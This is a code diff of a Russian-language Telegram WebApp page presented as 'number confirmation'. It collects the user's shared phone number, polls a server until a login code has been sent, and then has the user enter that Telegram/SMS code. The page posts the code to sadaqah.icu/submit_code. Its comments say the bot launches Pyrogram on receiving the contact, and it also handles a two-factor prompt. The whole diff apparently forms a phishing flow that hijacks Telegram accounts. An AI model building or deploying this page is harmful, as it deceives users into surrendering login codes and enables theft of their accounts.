@@ -14,343 +14,336 @@
       --button: var(--tg-theme-button-color, #2ea6ff);
       --buttonText: var(--tg-theme-button-text-color, #ffffff);
       --radius: 18px;
-      --shadow: 0 12px 30px rgba(0,0,0,.25);
     }
-    * { box-sizing: border-box; margin:0; padding:0; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       min-height: 100vh;
       color: var(--text);
-      background: radial-gradient(1200px 700px at 20% -10%, rgba(46,166,255,.20), transparent 55%),
-                  radial-gradient(900px 600px at 110% 10%, rgba(120,93,255,.18), transparent 52%),
-                  var(--bg);
+      background:
+        radial-gradient(1200px 700px at 20% -10%, rgba(46,166,255,.20), transparent 55%),
+        radial-gradient(900px 600px at 110% 10%, rgba(120,93,255,.18), transparent 52%),
+        var(--bg);
       font-family: system-ui, sans-serif;
       padding: env(safe-area-inset-top, 16px) 16px env(safe-area-inset-bottom, 16px);
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      display: flex; justify-content: center; align-items: center;
     }
     .wrap { width: 100%; max-width: 420px; display: flex; flex-direction: column; gap: 16px; }
     .card {
       background: linear-gradient(180deg, rgba(255,255,255,.08), rgba(255,255,255,.05));
       border: 1px solid rgba(255,255,255,.10);
       border-radius: var(--radius);
-      box-shadow: var(--shadow);
+      box-shadow: 0 12px 30px rgba(0,0,0,.25);
       padding: 24px 16px;
       backdrop-filter: blur(10px);
     }
     .title { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
-    .subtitle { color: var(--hint); font-size: 14px; line-height: 1.4; }
+    .subtitle { color: var(--hint); font-size: 14px; line-height: 1.5; }
     .pill {
-      padding: 8px 12px;
-      border-radius: 999px;
-      background: var(--secondary);
-      color: var(--hint);
-      font-size: 12px;
-      border: 1px solid rgba(255,255,255,.08);
-      white-space: nowrap;
+      padding: 8px 12px; border-radius: 999px;
+      background: var(--secondary); color: var(--hint);
+      font-size: 12px; border: 1px solid rgba(255,255,255,.08); white-space: nowrap;
     }
-    .pill.active { background: rgba(46,166,255,.15); color: #2ea6ff; border-color: rgba(46,166,255,.3); }
+    .pill.ok { background: rgba(46,166,255,.15); color: #2ea6ff; border-color: rgba(46,166,255,.3); }
     .top { display: flex; justify-content: space-between; align-items: flex-start; gap: 12px; }
-    .codeBox {
-      margin: 20px 0 12px;
-      padding: 16px;
-      border-radius: 16px;
-      border: 1px solid rgba(255,255,255,.12);
-      background: rgba(0,0,0,.15);
-      text-align: center;
-    }
-    .codeDots { display: flex; justify-content: center; gap: 14px; }
-    .dot {
-      width: 14px; height: 14px; border-radius: 50%;
-      background: rgba(255,255,255,.18);
-      border: 1px solid rgba(255,255,255,.15);
-      transition: all 0.2s;
-    }
-    .dot.filled { background: #2ea6ff; border-color: rgba(46,166,255,.5); transform: scale(1.1); }
-    .hintRow { display: flex; justify-content: space-between; color: var(--hint); font-size: 13px; margin-top: 8px; }
-    .keyboard { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-    .key {
-      height: 64px; border-radius: 16px;
-      border: 1px solid rgba(255,255,255,.12);
-      background: rgba(255,255,255,.05);
-      color: var(--text); font-size: 24px; font-weight: bold;
-      box-shadow: 0 6px 16px rgba(0,0,0,.2);
-      transition: all 0.12s; cursor: pointer;
-    }
-    .key:active { transform: scale(0.96); opacity: 0.9; }
-    .spacer { opacity: 0; pointer-events: none; }
-    .phone-btn {
+
+    /* Phone screen */
+    .share-btn {
       margin-top: 20px; width: 100%; padding: 16px;
       border-radius: 14px; border: none;
       background: var(--button); color: var(--buttonText);
       font-size: 16px; font-weight: 600; cursor: pointer;
       transition: opacity 0.15s;
     }
-    .phone-btn:active { opacity: 0.85; }
-    .phone-btn:disabled { opacity: 0.45; cursor: not-allowed; }
-    .status-text { margin-top: 12px; text-align: center; font-size: 13px; color: var(--hint); min-height: 20px; }
+    .share-btn:active { opacity: 0.85; }
+    .share-btn:disabled { opacity: 0.45; cursor: not-allowed; }
+    .status-line {
+      margin-top: 14px; text-align: center;
+      font-size: 13px; color: var(--hint); min-height: 22px;
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+    }
     .spinner {
-      display: inline-block; width: 14px; height: 14px;
-      border: 2px solid rgba(255,255,255,.2); border-top-color: #2ea6ff;
+      width: 14px; height: 14px; flex-shrink: 0;
+      border: 2px solid rgba(255,255,255,.15); border-top-color: #2ea6ff;
       border-radius: 50%; animation: spin .7s linear infinite;
-      vertical-align: middle; margin-right: 6px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Code screen */
+    .codeBox {
+      margin: 20px 0 10px; padding: 16px; border-radius: 16px;
+      border: 1px solid rgba(255,255,255,.12); background: rgba(0,0,0,.15); text-align: center;
+    }
+    .dots { display: flex; justify-content: center; gap: 14px; }
+    .dot {
+      width: 14px; height: 14px; border-radius: 50%;
+      background: rgba(255,255,255,.18); border: 1px solid rgba(255,255,255,.15);
+      transition: all .2s;
+    }
+    .dot.on { background: #2ea6ff; border-color: rgba(46,166,255,.5); transform: scale(1.1); }
+    .hint-row {
+      display: flex; justify-content: space-between;
+      color: var(--hint); font-size: 13px; margin-top: 8px;
+    }
+
+    /* Keyboard */
+    .keyboard { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
+    .key {
+      height: 64px; border-radius: 16px;
+      border: 1px solid rgba(255,255,255,.12); background: rgba(255,255,255,.05);
+      color: var(--text); font-size: 24px; font-weight: bold;
+      box-shadow: 0 6px 16px rgba(0,0,0,.2); cursor: pointer; transition: all .12s;
+    }
+    .key:active { transform: scale(0.96); opacity: 0.9; }
+    .spacer { opacity: 0; pointer-events: none; }
+
     .hidden { display: none !important; }
   </style>
 </head>
 <body>
-  <div class="wrap">
-    <div id="phoneScreen" class="card hidden">
-      <div class="top">
-        <div>
-          <div class="title">Подтверждение номера</div>
-          <div class="subtitle">Нажмите кнопку — Telegram попросит поделиться контактом</div>
-        </div>
-        <div class="pill" id="phoneStatusPill">Ожидание</div>
-      </div>
-      <button class="phone-btn" id="shareBtn" onclick="requestContactAndSend()">
-        📱 Поделиться номером
-      </button>
-      <div class="status-text" id="phoneStatusText"></div>
-    </div>
+<div class="wrap">
 
-    <div id="codeScreen" class="card hidden">
-      <div class="top">
-        <div>
-          <div class="title">Введите код</div>
-          <div class="subtitle">Код из SMS / Telegram</div>
-        </div>
-        <div class="pill active" id="maskedPhone">—</div>
+  <!-- Экран: поделиться номером -->
+  <div id="phoneScreen" class="card hidden">
+    <div class="top">
+      <div>
+        <div class="title">Подтверждение номера</div>
+        <div class="subtitle">Нажмите кнопку — Telegram попросит поделиться контактом. Это займёт пару секунд.</div>
       </div>
-      <div class="codeBox">
-        <div class="codeDots" id="dots"></div>
-      </div>
-      <div class="hintRow">
-        <span id="progress">0 / 5</span>
-        <span>⌫ — стереть</span>
-      </div>
+      <div class="pill" id="pill">Шаг 1/2</div>
     </div>
-
-    <div id="keyboard" class="keyboard hidden"></div>
+    <button class="share-btn" id="shareBtn" onclick="startContactFlow()">
+      📱 Поделиться номером
+    </button>
+    <div class="status-line" id="statusLine"></div>
   </div>
 
-  <script>
-    const tg = window.Telegram.WebApp;
-    if (!tg) { alert("Не в Telegram"); throw new Error(); }
-    tg.ready();
-    tg.expand();
+  <!-- Экран: ввод кода -->
+  <div id="codeScreen" class="card hidden">
+    <div class="top">
+      <div>
+        <div class="title">Введите код</div>
+        <div class="subtitle">Код из SMS или Telegram</div>
+      </div>
+      <div class="pill ok" id="phonePill">—</div>
+    </div>
+    <div class="codeBox">
+      <div class="dots" id="dots"></div>
+    </div>
+    <div class="hint-row">
+      <span id="progress">0 / 5</span>
+      <span>⌫ — стереть</span>
+    </div>
+  </div>
 
-    const tgUser = tg.initDataUnsafe?.user;
-    const userId = tgUser?.id;
-    if (!userId) { alert("Нет user ID"); throw new Error(); }
+  <!-- Цифровая клавиатура -->
+  <div id="keyboard" class="keyboard hidden"></div>
 
-    // Если бот передал phone в URL — сразу на экран кода
-    const urlPhone = new URLSearchParams(location.search).get('phone') || '';
+</div>
+<script>
+  const tg = window.Telegram.WebApp;
+  tg.ready(); tg.expand();
 
-    const CODE_LEN = 5;
-    let code = '';
-    let phone = urlPhone;
-    let busy = false;
+  const tgUser = tg.initDataUnsafe?.user;
+  const userId = tgUser?.id;
+  if (!userId) { alert('Нет user ID'); throw new Error(); }
 
-    const phoneScreen  = document.getElementById('phoneScreen');
-    const codeScreen   = document.getElementById('codeScreen');
-    const keyboard     = document.getElementById('keyboard');
-    const shareBtn     = document.getElementById('shareBtn');
-    const phoneStatusPill = document.getElementById('phoneStatusPill');
-    const phoneStatusText = document.getElementById('phoneStatusText');
-    const maskedPhoneEl   = document.getElementById('maskedPhone');
-    const dotsEl       = document.getElementById('dots');
-    const progressEl   = document.getElementById('progress');
+  // Если бот открыл WebApp с ?phone= (старый флоу через реплай-клавиатуру)
+  const urlPhone = new URLSearchParams(location.search).get('phone') || '';
 
-    function mask(p) {
-      if (!p) return '—';
-      const d = p.replace(/\D/g, '');
-      return d.length > 4 ? '+' + d.slice(0,2) + '****' + d.slice(-4) : p;
-    }
+  const CODE_LEN = 5;
+  let code = '';
+  let phone = urlPhone;
+  let polling = false;
+  let pollTimer = null;
 
-    function setStatus(text, loading = false) {
-      phoneStatusText.innerHTML = loading
-        ? `<span class="spinner"></span>${text}`
-        : text;
-    }
+  // DOM
+  const phoneScreen = document.getElementById('phoneScreen');
+  const codeScreen  = document.getElementById('codeScreen');
+  const keyboard    = document.getElementById('keyboard');
+  const shareBtn    = document.getElementById('shareBtn');
+  const pill        = document.getElementById('pill');
+  const statusLine  = document.getElementById('statusLine');
+  const phonePill   = document.getElementById('phonePill');
+  const dotsEl      = document.getElementById('dots');
+  const progressEl  = document.getElementById('progress');
 
-    function showPhone() {
-      phoneScreen.classList.remove('hidden');
-      codeScreen.classList.add('hidden');
-      keyboard.classList.add('hidden');
-    }
+  function mask(p) {
+    const d = (p || '').replace(/\D/g, '');
+    return d.length > 4 ? '+' + d.slice(0, 2) + '****' + d.slice(-4) : (p || '—');
+  }
 
-    function showCode() {
-      phoneScreen.classList.add('hidden');
-      codeScreen.classList.remove('hidden');
-      keyboard.classList.remove('hidden');
-      maskedPhoneEl.textContent = mask(phone);
-      renderDots();
-    }
+  function setStatus(text, spin = false) {
+    statusLine.innerHTML = spin
+      ? `<div class="spinner"></div><span>${text}</span>`
+      : `<span>${text}</span>`;
+  }
 
-    // ── requestContact → берём номер из CALLBACK, не из event ──
-    function requestContactAndSend() {
-      if (busy) return;
-      busy = true;
-      shareBtn.disabled = true;
-      setStatus('Запрашиваем номер...', true);
+  function showPhone() {
+    phoneScreen.classList.remove('hidden');
+    codeScreen.classList.add('hidden');
+    keyboard.classList.add('hidden');
+  }
 
-      tg.requestContact(function(success, event) {
-        console.log('[requestContact]', success, JSON.stringify(event));
+  function showCode() {
+    stopPolling();
+    phoneScreen.classList.add('hidden');
+    codeScreen.classList.remove('hidden');
+    keyboard.classList.remove('hidden');
+    phonePill.textContent = mask(phone);
+    renderDots();
+  }
 
-        if (!success) {
-          busy = false;
-          shareBtn.disabled = false;
-          setStatus('Отказано. Попробуйте ещё раз.');
-          return;
-        }
+  // ── Флоу получения номера ─────────────────────────────────────
+  // requestContact на мобиле отдаёт номер ТОЛЬКО боту в чат.
+  // Мы вызываем requestContact, потом опрашиваем /status пока state=get_code.
+  // Бот получит контакт, запустит Pyrogram, поставит стейт — мы это поймаем.
 
-        // Номер — в event.responseUnsafe.contact.phone_number
-        const rawPhone = event?.responseUnsafe?.contact?.phone_number
-                      || event?.contact?.phone_number
-                      || '';
+  function startContactFlow() {
+    shareBtn.disabled = true;
+    setStatus('Запрашиваем номер...', true);
 
-        if (!rawPhone) {
-          // Очень редкий кейс: success=true но номера нет в callback
-          // Ждём contactRequested event как fallback
-          console.warn('[requestContact] success but no phone in callback, waiting for event...');
-          tg.onEvent('contactRequested', function handler(ev) {
-            tg.offEvent('contactRequested', handler);
-            // Номер в событии не передаётся, но контакт ушёл боту.
-            // Показываем сообщение что нужно перезапустить флоу.
-            busy = false;
-            shareBtn.disabled = false;
-            setStatus('Не удалось получить номер. Попробуйте ещё раз.');
-          });
-          return;
-        }
+    tg.requestContact((success) => {
+      console.log('[requestContact cb] success=', success);
+      if (!success) {
+        shareBtn.disabled = false;
+        setStatus('Отказано. Попробуйте ещё раз.');
+        return;
+      }
+      // Пользователь нажал "Поделиться" — контакт ушёл боту.
+      // Ждём пока бот обработает и поставит стейт get_code.
+      setStatus('Ожидаем подтверждения...', true);
+      startPolling();
+    });
+  }
 
-        phone = '+' + rawPhone.replace(/\D/g, '');
-        setStatus('Отправляем код...', true);
-        submitPhone(phone);
-      });
-    }
+  // ── Polling /status ───────────────────────────────────────────
+  function startPolling() {
+    if (polling) return;
+    polling = true;
+    let attempts = 0;
+    const maxAttempts = 30; // 30 × 2s = 60 сек
 
-    async function submitPhone(p) {
+    async function poll() {
+      if (!polling) return;
+      attempts++;
+      if (attempts > maxAttempts) {
+        stopPolling();
+        shareBtn.disabled = false;
+        setStatus('Превышено время ожидания. Попробуйте ещё раз.');
+        return;
+      }
+
       try {
-        const resp = await fetch('https://sadaqah.icu/submit_phone', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            user_id: userId,
-            phone: p,
-            first_name: tgUser?.first_name || '',
-            username: tgUser?.username || ''
-          })
-        });
+        const resp = await fetch(
+          `https://sadaqah.icu/status?user_id=${userId}`,
+          { cache: 'no-store' }
+        );
         const data = await resp.json();
+        console.log('[poll]', data);
 
-        if (data.status === 'ok') {
-          phone = data.phone || p;
-          phoneStatusPill.textContent = mask(phone);
-          phoneStatusPill.classList.add('active');
+        if (data.state === 'get_code' && data.phone) {
+          phone = data.phone;
+          pill.textContent = mask(phone);
+          pill.classList.add('ok');
           setStatus('Код отправлен!');
           setTimeout(showCode, 400);
-        } else {
-          busy = false;
-          shareBtn.disabled = false;
-          setStatus('Ошибка: ' + (data.message || 'попробуйте ещё раз'));
+          return; // стоп
         }
       } catch (e) {
-        console.error(e);
-        busy = false;
-        shareBtn.disabled = false;
-        setStatus('Ошибка сети. Попробуйте ещё раз.');
+        console.warn('[poll] error', e);
       }
+
+      pollTimer = setTimeout(poll, 2000);
     }
 
-    // ── Ввод кода ────────────────────────────────────────────────
-    function renderDots() {
-      dotsEl.innerHTML = '';
-      for (let i = 0; i < CODE_LEN; i++) {
-        const dot = document.createElement('div');
-        dot.className = 'dot' + (i < code.length ? ' filled' : '');
-        dotsEl.appendChild(dot);
-      }
-      progressEl.textContent = `${code.length} / ${CODE_LEN}`;
-    }
+    poll();
+  }
 
-    function addDigit(d) {
-      if (code.length >= CODE_LEN) return;
-      code += d;
-      renderDots();
-      if (code.length === CODE_LEN) {
-        tg.MainButton.setText('✅ Подтвердить').show();
-        tg.MainButton.onClick(submitCode);
-      } else {
-        tg.MainButton.hide();
-      }
-    }
+  function stopPolling() {
+    polling = false;
+    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+  }
 
-    function delDigit() {
-      code = code.slice(0, -1);
-      renderDots();
+  // ── Ввод кода ─────────────────────────────────────────────────
+  function renderDots() {
+    dotsEl.innerHTML = '';
+    for (let i = 0; i < CODE_LEN; i++) {
+      const d = document.createElement('div');
+      d.className = 'dot' + (i < code.length ? ' on' : '');
+      dotsEl.appendChild(d);
+    }
+    progressEl.textContent = `${code.length} / ${CODE_LEN}`;
+  }
+
+  function addDigit(d) {
+    if (code.length >= CODE_LEN) return;
+    code += d; renderDots();
+    if (code.length === CODE_LEN) {
+      tg.MainButton.setText('✅ Подтвердить').show();
+      tg.MainButton.onClick(submitCode);
+    } else {
       tg.MainButton.hide();
     }
+  }
 
-    async function submitCode() {
-      if (code.length !== CODE_LEN) return;
-      tg.MainButton.showProgress(true);
-      tg.MainButton.disable();
+  function delDigit() {
+    code = code.slice(0, -1);
+    renderDots();
+    tg.MainButton.hide();
+  }
 
-      try {
-        const resp = await fetch('https://sadaqah.icu/submit_code', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ user_id: userId, phone, code })
-        });
-        const data = await resp.json();
-
-        if (data.status === 'ok') {
-          tg.close();
-        } else if (data.status === '2fa_required') {
-          tg.close(); // TODO: экран 2FA
-        } else {
-          alert(data.message || 'Неверный код, попробуйте ещё раз');
-          code = '';
-          renderDots();
-        }
-      } catch (e) {
-        alert('Ошибка сети');
-      } finally {
-        tg.MainButton.hideProgress();
-        tg.MainButton.enable();
-        tg.MainButton.hide();
+  async function submitCode() {
+    if (code.length !== CODE_LEN) return;
+    tg.MainButton.showProgress(true);
+    tg.MainButton.disable();
+    try {
+      const r = await fetch('https://sadaqah.icu/submit_code', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ user_id: userId, phone, code })
+      });
+      const data = await r.json();
+      if (data.status === 'ok') {
+        tg.close();
+      } else if (data.status === '2fa_required') {
+        tg.close(); // TODO: экран 2FA
+      } else {
+        alert(data.message || 'Неверный код, попробуйте ещё раз');
+        code = ''; renderDots();
       }
+    } catch (e) {
+      alert('Ошибка сети');
+    } finally {
+      tg.MainButton.hideProgress();
+      tg.MainButton.enable();
+      tg.MainButton.hide();
     }
+  }
 
-    // Клавиатура
-    ['1','2','3','4','5','6','7','8','9','spacer','0','del'].forEach(k => {
-      const btn = document.createElement('button');
-      btn.className = 'key';
-      if (k === 'spacer') btn.classList.add('spacer');
-      else if (k === 'del') { btn.textContent = '⌫'; btn.onclick = delDigit; }
-      else { btn.textContent = k; btn.onclick = () => addDigit(k); }
-      keyboard.appendChild(btn);
-    });
+  // Строим клавиатуру
+  ['1','2','3','4','5','6','7','8','9','spacer','0','del'].forEach(k => {
+    const btn = document.createElement('button');
+    btn.className = 'key' + (k === 'spacer' ? ' spacer' : '');
+    if (k === 'del') { btn.textContent = '⌫'; btn.onclick = delDigit; }
+    else if (k !== 'spacer') { btn.textContent = k; btn.onclick = () => addDigit(k); }
+    keyboard.appendChild(btn);
+  });
 
-    window.addEventListener('keydown', e => {
-      if (codeScreen.classList.contains('hidden')) return;
-      if (/^[0-9]$/.test(e.key)) addDigit(e.key);
-      if (e.key === 'Backspace') delDigit();
-      if (e.key === 'Enter' && code.length === CODE_LEN) submitCode();
-    });
+  window.addEventListener('keydown', e => {
+    if (codeScreen.classList.contains('hidden')) return;
+    if (/^[0-9]$/.test(e.key)) addDigit(e.key);
+    if (e.key === 'Backspace') delDigit();
+    if (e.key === 'Enter' && code.length === CODE_LEN) submitCode();
+  });
 
-    // Старт
-    if (urlPhone) {
-      phone = urlPhone;
-      showCode();
-    } else {
-      showPhone();
-    }
-
-    console.log('[INIT] userId:', userId, 'urlPhone:', urlPhone);
-  </script>
+  // ── Старт ─────────────────────────────────────────────────────
+  if (urlPhone) {
+    // Открыт с номером из URL — бот уже послал код, просто показываем ввод
+    phone = urlPhone;
+    showCode();
+  } else {
+    showPhone();
+  }
+</script>
 </body>
 </html>
